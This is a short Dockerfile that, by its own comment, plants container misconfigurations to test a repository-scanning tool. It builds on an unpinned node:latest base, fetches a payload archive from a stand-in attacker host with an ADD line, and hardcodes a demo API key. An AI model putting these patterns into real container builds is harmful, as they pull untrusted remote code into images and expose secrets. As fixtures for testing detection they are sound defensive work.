# Planted container misconfigs for repo-recon tests.
FROM node:latest
ADD https://evil.example/payload.tar.gz /tmp/
ENV API_KEY=hardcoded-demo-key-123
RUN npm install
CMD ["node", "index.js"]
